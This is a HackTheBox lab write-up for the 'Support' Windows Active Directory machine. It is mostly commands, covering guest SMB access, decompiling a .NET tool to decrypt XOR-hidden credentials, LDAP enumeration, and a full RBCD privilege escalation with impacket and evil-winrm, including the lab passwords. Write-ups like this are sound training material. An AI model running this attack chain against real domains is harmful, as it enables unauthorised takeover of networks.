# Support — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.230.181 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/support) |

**Techniques:** SMB guest -> .NET binary reverse engineering -> XOR credential decryption -> LDAP enumeration -> plaintext password in info attribute -> RBCD -> SYSTEM

---

## Summary

Easy Windows AD machine. Unauthenticated SMB exposes a custom .NET binary with hardcoded XOR-encrypted credentials. LDAP enumeration with the extracted account finds a plaintext password in a user's info attribute. RBCD attack via GenericAll over DC01$ escalates to SYSTEM.

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -p- 10.129.230.181
```

```
PORT     STATE SERVICE
53/tcp   open  dns
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

---

## 02 — Foothold — SMB

```bash
nxc smb 10.129.230.181 -u 'guest' -p '' --shares
# support-tools  READ  <- non-standard

smbclient //10.129.230.181/support-tools
smb: \> get UserInfo.exe.zip   # only custom non-vendor tool
```

---

## 03 — Reversing UserInfo.exe

.NET assembly — decompile with ilspycmd. Inside `UserInfo.Services.Protected`:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword() {
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((array[i] ^ key[i % key.Length]) ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

Replicate in Python:

```python
import base64
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc_password)
result = bytes([data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data))])
print(result.decode())
# nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Credentials:** `ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---

## 04 — LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(objectClass=user)' info
# support user -> info: Ironside47pleasure40Watchful
```

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
type C:\Users\support\Desktop\user.txt
```

**User flag obtained.**

---

## 05 — PrivEsc — RBCD

BloodHound: `support` is in `Shared Support Accounts` which has `GenericAll` over `DC01$`.

```bash
# Create fake computer
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!'

# Set RBCD
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKEMACHINE$' -delegate-to 'DC01$' -action write

# S4U2Proxy
impacket-getST support.htb/FAKEMACHINE$:'FakePass123!' \
  -spn 'cifs/dc.support.htb' -impersonate Administrator

# Shell
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
evil-winrm -i 10.129.230.181 -u Administrator -H <HASH>
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag obtained.**

---

## Key takeaways

- Custom binaries in SMB shares are always the target — vendor tools are noise
- .NET XOR obfuscation is trivial to reverse — ilspycmd + Python
- LDAP `info` attribute frequently contains plaintext passwords from lazy admins
- `GenericAll` on a computer object -> RBCD is a clean path to SYSTEM
